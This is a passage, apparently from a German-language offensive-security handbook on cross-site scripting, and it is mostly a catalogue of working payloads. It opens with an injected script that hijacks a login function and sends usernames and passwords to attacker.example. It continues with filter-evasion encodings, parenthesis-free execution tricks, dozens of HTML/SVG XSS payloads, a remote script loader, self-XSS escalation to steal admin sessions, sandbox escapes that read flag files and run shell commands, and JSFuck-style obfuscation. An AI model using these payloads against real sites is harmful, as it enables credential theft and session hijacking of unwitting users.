Um URLs kürzer zu halten und naive Keyword-Filter zu umgehen, kannst du deine eigentliche Logik base64-encodieren und mit `eval(atob('...'))` auswerten. Wenn einfache Keyword-Filter Bezeichner wie `alert`, `eval` oder `atob` blockieren, verwende Unicode-escaped Bezeichner, die im Browser identisch kompiliert werden, aber String-Matching-Filter umgehen:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
Wichtiger Scoping-Hinweis: `const`/`let`, die innerhalb von `eval()` deklariert werden, sind block-scoped und erzeugen KEINE globals; sie sind für spätere Skripte nicht zugänglich. Verwende ein dynamisch injiziertes `<script>`-Element, um bei Bedarf globale, non-rebindable hooks zu definieren (z. B. um einen form handler zu hijacken):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Referenz: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode Encode JS-Ausführung
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript-Techniken zum Umgehen von Blacklists

**Zeichenketten**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Spezielle Escape-Sequenzen**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Leerzeichen-Substitutionen innerhalb von JS code**
```javascript
<TAB>
/**/
```
**JavaScript comments (aus dem** [**JavaScript Comments**](#javascript-comments) **Trick)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript Zeilenumbrüche (aus** [**JavaScript new line**](#javascript-new-lines) **Trick)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript Leerzeichen**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript in einem Kommentar**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript ohne Klammern**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Beliebiger Funktionsaufruf (alert)**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

Es gibt **JS code**, das **unsichere, vom Angreifer kontrollierte Daten** wie `location.href` verwendet. Ein Angreifer könnte dies ausnutzen, um beliebigen JS-Code auszuführen.\
**Due to the extension of the explanation of** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

Dort findest du eine ausführliche **Erklärung, was DOM vulnerabilities sind, wie sie ausgelöst werden und wie man sie ausnutzt**.\
Vergiss auch nicht, dass **am Ende des genannten Beitrags** eine Erklärung zu [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering) zu finden ist.

### Upgrading Self-XSS

### Cookie XSS

Wenn du eine XSS auslösen kannst, indem du die Payload in einem Cookie sendest, handelt es sich normalerweise um ein self-XSS. Wenn du jedoch eine **vulnerable subdomain to XSS** findest, könntest du diese XSS ausnutzen, um ein Cookie für die gesamte Domain zu injizieren und damit die cookie XSS in der Hauptdomain oder anderen Subdomains (denjenigen, die für cookie XSS anfällig sind) auszulösen. Für diesen Zweck kannst du den cookie tossing attack verwenden:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

Ein großartiges Beispiel für den Missbrauch dieser Technik findest du in [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Sending your session to the admin

Vielleicht kann ein Benutzer sein Profil mit dem Admin teilen, und wenn das self XSS im Profil des Benutzers vorhanden ist und der Admin darauf zugreift, wird er die Verwundbarkeit auslösen.

### Session Mirroring

Wenn du ein self XSS findest und die Webseite eine **session mirroring for administrators** hat, die z. B. Kunden erlaubt, um Hilfe zu bitten, sieht der Admin, um dir zu helfen, was du in deiner Sitzung siehst, allerdings aus seiner eigenen Sitzung.

Du könntest so den **administrator trigger your self XSS** dazu bringen und seine Cookies/Sitzung stehlen.

## Other Bypasses

### Bypassing sanitization via WASM linear-memory template overwrite

Wenn eine Web-App Emscripten/WASM verwendet, liegen konstante Strings (wie HTML-Format-Stubs) im beschreibbaren linear memory. Ein einziger in‑WASM Overflow (z. B. unchecked memcpy in einem Edit-Pfad) kann benachbarte Strukturen korrumpieren und Schreibvorgänge auf diese Konstanten umleiten. Das Überschreiben einer Vorlage wie "<article><p>%.*s</p></article>" zu "<img src=1 onerror=%.*s>" verwandelt sanitisierten Input in einen JavaScript-Handler-Wert und führt beim Rendern zu sofortigem DOM XSS.

Check the dedicated page with exploitation workflow, DevTools memory helpers, and defenses:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

Du solltest prüfen, ob die **reflected values** auf dem Server (oder clientseitig) **unicode normalized** werden, und diese Funktionalität ausnutzen, um Schutzmaßnahmen zu umgehen. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

Aufgrund von **RoR mass assignment** werden Anführungszeichen in das HTML eingefügt, wodurch die Quote-Einschränkung umgangen wird und zusätzliche Felder (onfocus) innerhalb des Tags hinzugefügt werden können.\
Formularbeispiel ([from this report](https://hackerone.com/reports/709336)), wenn du die Payload sendest:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Das Paar "Key","Value" wird wie folgt zurückgegeben:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Dann wird das onfocus-Attribut eingefügt und XSS tritt auf.

### Spezielle Kombinationen
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS with header injection in a 302 response

Wenn du feststellst, dass du **inject headers in a 302 Redirect response** kannst, könntest du versuchen, **make the browser execute arbitrary JavaScript**. Das ist **nicht trivial**, da moderne Browser den HTTP-Response-Body nicht interpretieren, wenn der HTTP-Statuscode 302 ist, sodass ein einfaches cross-site scripting payload nutzlos ist.

In [**this report**](https://www.gremwell.com/firefox-xss-302) und [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) kannst du nachlesen, wie du mehrere Protokolle im Location header testen kannst und prüfst, ob eines davon dem browser erlaubt, das XSS payload im Body zu inspizieren und auszuführen.\
Past known protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Nur Buchstaben, Zahlen und Punkte

Wenn du den **callback** angeben kannst, den javascript ausführen wird, und dieser auf diese Zeichen beschränkt ist. [**Lies diesen Abschnitt dieses Beitrags**](#javascript-function), um zu erfahren, wie man dieses Verhalten missbrauchen kann.

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Wenn du versuchst, ein Script mit einem **content-type** wie `application/octet-stream` zu laden, wirft Chrome folgenden Fehler:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Die einzigen **Content-Type**s, die Chrome erlauben, ein **loaded script** auszuführen, sind die in der const **`kSupportedJavascriptTypes`** aus [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Script-Typen für XSS

(Von [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Also, welche Typen könnten angegeben werden, um ein Script zu laden?
```html
<script type="???"></script>
```
Die Antwort ist:

- **module** (Standard, nichts zu erklären)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles ist eine Funktion, mit der man eine Menge an Daten (HTML, CSS, JS…) zu einer **`.wbn`**-Datei zusammenpacken kann.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Ermöglicht die Verbesserung der Import-Syntax
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
Dieses Verhalten wurde in [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) verwendet, um eine Bibliothek auf eval umzuleiten; ein Missbrauch kann XSS auslösen.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Diese Funktion dient hauptsächlich dazu, einige Probleme zu lösen, die durch Pre-Rendering verursacht werden. Sie funktioniert folgendermaßen:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types für XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Die folgenden Content-Types können XSS in allen Browsern ausführen:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? nicht in der Liste, aber ich glaube, das habe ich in einem CTF gesehen)
- application/rss+xml (off)
- application/atom+xml (off)

In anderen Browsern können andere **`Content-Types`** verwendet werden, um beliebiges JS auszuführen, siehe: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

Wenn die Seite einen text/xml Content-Type zurückgibt, ist es möglich, einen Namespace anzugeben und beliebiges JS auszuführen:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Spezielle Ersetzungsmuster

Wenn etwas wie **`"some {{template}} data".replace("{{template}}", <user_input>)`** verwendet wird, könnte der Angreifer [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) nutzen, um einige Schutzmaßnahmen zu umgehen: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

Zum Beispiel wurde in [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA) dies verwendet, um eine JSON-Zeichenkette innerhalb eines script zu escapen und beliebigen Code auszuführen.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

Wenn du nur eine begrenzte Menge an Zeichen zur Verfügung hast, siehe diese anderen gültigen Lösungen für XSJail-Probleme:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Wenn **everything is undefined** vor der Ausführung von untrusted code (wie in [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)), ist es möglich, nützliche Objekte "aus dem Nichts" zu erzeugen, um die Ausführung von arbitrary untrusted code zu missbrauchen:

- Mit import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Indirekter Zugriff auf `require`

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) Module werden von Node.js innerhalb einer Funktion gekapselt, wie folgt:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Daher, wenn wir von diesem Modul aus **eine andere Funktion aufrufen können**, ist es möglich, `arguments.callee.caller.arguments[1]` von dieser Funktion zu verwenden, um auf **`require`** zuzugreifen:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
Wie im vorherigen Beispiel kann man **use error handlers** nutzen, um auf den **wrapper** des Moduls zuzugreifen und die **`require`**-Funktion zu erhalten:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **Verschiedene obfuscations auf einer Seite:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- Mehr ausgefeiltes JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
